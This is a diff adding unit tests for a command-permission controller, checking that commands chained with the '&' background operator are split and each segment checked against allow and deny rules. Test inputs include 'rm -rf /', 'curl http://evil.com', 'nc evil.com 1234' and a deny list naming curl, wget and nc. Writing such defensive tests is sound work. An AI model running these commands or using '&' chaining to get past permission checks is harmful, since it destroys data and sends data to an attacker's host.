@@ -976,6 +976,140 @@ describe("CommandPermissionController", () => {
 		})
 	})
 
+	describe("Background Operator (&) Separation", () => {
+		it("should deny a non-allowlisted command appended after &", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["gh pr view *"],
+			})
+			const controller = new CommandPermissionController()
+
+			// "gh pr view 123 & rm -rf /" runs gh in the background and then rm.
+			// The rm segment is not in the allow list, so the command must be denied.
+			const result = controller.validateCommand("gh pr view 123 & rm -rf /")
+			result.allowed.should.be.false()
+			result.reason.should.equal("segment_no_match")
+			result.failedSegment!.should.equal("rm -rf /")
+		})
+
+		it("should deny a denied command appended after & (deny-only config)", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				deny: ["curl *", "wget *", "nc *"],
+			})
+			const controller = new CommandPermissionController()
+
+			// Background exfiltration: the curl segment must still be matched by the deny rule.
+			const result = controller.validateCommand("ls & curl http://evil.com")
+			result.allowed.should.be.false()
+			result.reason.should.equal("segment_denied")
+			result.failedSegment!.should.equal("curl http://evil.com")
+		})
+
+		it("should deny & bypass without surrounding whitespace", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				deny: ["curl *"],
+			})
+			const controller = new CommandPermissionController()
+
+			controller.validateCommand("ls& curl http://evil.com").allowed.should.be.false()
+		})
+
+		it("should validate every segment in a chain mixing & with other operators", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["echo *", "ls *"],
+			})
+			const controller = new CommandPermissionController()
+
+			// echo and ls are allowed; nc is not.
+			const result = controller.validateCommand("echo start & ls -la & nc evil.com 1234")
+			result.allowed.should.be.false()
+			result.failedSegment!.should.equal("nc evil.com 1234")
+		})
+
+		it("should allow a legitimate background workflow when all segments are allowed", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *"],
+			})
+			const controller = new CommandPermissionController()
+
+			// Running a watcher in the background and another npm task is legitimate.
+			controller.validateCommand("npm run watch & npm run build").allowed.should.be.true()
+		})
+
+		it("should allow a single trailing background command that is allowed", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *"],
+			})
+			const controller = new CommandPermissionController()
+
+			controller.validateCommand("npm run dev &").allowed.should.be.true()
+		})
+
+		it("should treat &> as a redirect, not a separator (blocked by default)", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["echo *"],
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("echo hello &> out.txt")
+			result.allowed.should.be.false()
+			result.reason.should.equal("redirect_detected")
+		})
+
+		it("should treat &>> as a redirect, not a separator (blocked by default)", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["echo *"],
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("echo hello &>> out.txt")
+			result.allowed.should.be.false()
+			result.reason.should.equal("redirect_detected")
+		})
+
+		it("should allow &> redirect-all of an allowed command when allowRedirects is true", () => {
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["echo *"],
+				allowRedirects: true,
+			})
+			const controller = new CommandPermissionController()
+
+			// With redirects allowed, "echo hello &> out.txt" is one allowed command, not a chain.
+			controller.validateCommand("echo hello &> out.txt").allowed.should.be.true()
+		})
+
+		it("should still flush on a real & separator that follows a &> redirect target", () => {
+			// Locks the carve-out boundary: the first & is part of '&>' (redirect), but the
+			// second & is a genuine background separator and must isolate the curl segment.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				deny: ["curl *"],
+				allowRedirects: true,
+			})
+			const controller = new CommandPermissionController()
+
+			const result = controller.validateCommand("echo ok &> /dev/null & curl http://evil.com")
+			result.allowed.should.be.false()
+			result.failedSegment!.should.equal("curl http://evil.com")
+		})
+
+		it("should require a shell job-control builtin after & to be allowlisted", () => {
+			// Documented behavior: because & is now a separator, trailing job-control builtins
+			// (wait/jobs/fg/bg/disown) become their own segment and must be allowlisted.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *"],
+			})
+			const controller = new CommandPermissionController()
+
+			controller.validateCommand("npm run dev & wait").allowed.should.be.false()
+
+			// Adding the builtin to the allow list restores the workflow.
+			process.env[COMMAND_PERMISSIONS_ENV_VAR] = JSON.stringify({
+				allow: ["npm *", "wait"],
+			})
+			const controller2 = new CommandPermissionController()
+			controller2.validateCommand("npm run dev & wait").allowed.should.be.true()
+		})
+	})
+
 	describe("No Config Bypass Prevention", () => {
 		it("should NOT check anything when no config is set (backward compatibility)", () => {
 			delete process.env[COMMAND_PERMISSIONS_ENV_VAR]
